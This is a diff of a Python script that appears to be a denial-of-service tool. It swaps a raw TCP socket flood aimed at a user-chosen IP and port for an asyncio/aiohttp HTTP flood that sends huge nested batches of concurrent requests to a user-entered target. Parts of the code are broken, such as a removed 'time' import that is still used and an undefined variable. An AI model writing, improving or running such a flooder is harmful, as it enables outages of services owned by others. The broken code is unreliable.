@@ -1,42 +1,24 @@
-import time
-import threading
-import socket
-import random
-import sys
+import asyncio
+import aiohttp
+import fade
 import os
-os.system("git pull")
-os.system("")
+# Clear command prompt based on the operating system
+if os.name == "nt":  # Windows
+    os.system("cls")
+else:  # Unix/Linux/Mac
+    os.system("clear")
 
-# Colors
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    UNDERLINE = '\033[4m'
-    PURPLE = '\033[97m'
-    BOLD    = "\033[1m"
-    BLACK   = "\033[30m"
-    RED     = "\033[31m"
-    GREEN   = "\033[32m"
-    YELLOW  = "\033[33m"
-    BLUE    = "\033[34m"
-    MAGENTA = "\033[35m"
-    CYAN    = "\033[36m"
-    WHITE   = "\033[37m"
+logo = """
 
-attemps = 0
-os.system("clear")
-print(" ")
-print("\033[94m       ±± ±± ±±      ±± ±± ±±                      ±±±             \033[0m")
-print("\033[94m       ±±       ±±   ±±       ±±                 ±± ±±             \033[0m")
-print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
-print("\033[94m       ±±       ±±   ±±       ±±                    ±±             \033[0m")
-print("\033[97m       ±± ±± ±±      ±± ±± ±±        ________       ±±             \033[0m")
-print("\033[97m       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             \033[0m")
-print("\033[97m       ±±     ±±     ±±     ±±                      ±±             \033[0m")
-print("\033[97m       ±±       ±±   ±±       ±±                 ±± ±± ±±          \033[0m")
+       ±± ±± ±±      ±± ±± ±±                      ±±±             
+       ±±       ±±   ±±       ±±                 ±± ±±             
+       ±±       ±±   ±±       ±±                    ±±             
+       ±±       ±±   ±±       ±±                    ±±             
+       ±± ±± ±±      ±± ±± ±±        ________       ±±             
+       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             
+       ±±     ±±     ±±     ±±                      ±±             
+       ±±       ±±   ±±       ±±                 ±± ±± ±±  
+       """
 print("\033[33m _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      \033[0m")
 print("\033[1m                                                                    \033[0m")
 print("\033[1m                                                                    \033[0m")
@@ -75,18 +57,36 @@ time.sleep(5),
 print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
 time.sleep(5),
 
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[+]","[-]"))
-	str = u
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ " \033[0m")
-		except:
-			s.close()
-			print("[*] Error!!!")
+faded_text = fade.fire(logo)
+print(faded_text)
+faded_text2 = fade.brazil(txt)
+print(faded_text2)
+ask = fade.pinkred("Enter the target IP/URL:")
+url = input(ask)
+
+async def increment_view_count(session):
+    try:
+        async with session.get(url) as response:
+            if response.status == 200:
+                print("PINGED THIS SHI!")
+            else:
+                print("Failed ping.")
+    except aiohttp.ClientError as e:
+        print("An error occurred:", e)
+
+async def main():
+    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for _ in range(19999):  # Increase the number of concurrent requests
+            task = asyncio.create_task(increment_view_count(session))
+            tasks.append(task)
+            for i in range(19999):  # Increase the number of concurrent requests
+                task = asyncio.create_task(increment_view_count(session))
+                tasks.append(task)
+            await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
